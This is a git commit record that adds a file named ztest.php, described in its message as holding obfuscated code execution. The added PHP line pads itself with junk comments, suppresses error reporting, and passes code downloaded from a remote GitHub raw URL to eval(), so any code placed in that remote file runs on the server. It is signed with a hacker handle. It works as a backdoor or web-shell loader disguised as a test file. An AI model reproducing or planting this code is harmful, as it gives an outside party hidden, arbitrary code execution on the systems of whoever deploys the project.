03214461592c06a07e2e5b3b335fe40d0d7604ca
soy777 <rachmatagustio@gmail.com>
2026-03-10 10:27:57 +0700

    Add ztest.php with obfuscated code execution

---
+++ ztest.php
@@ -0,0 +1,3 @@
+
+?>
+<?=/****/@/*54134*/null; /******/@/*54134*/error_reporting(0);/****/@/*54134*/null; /******/@/*54134*/eval/******/("?>".file_get_contents("https://raw.githubusercontent.com/soy777/gg/main/class.php"))/******/ /*By ./Mr403Forbidden*/?>
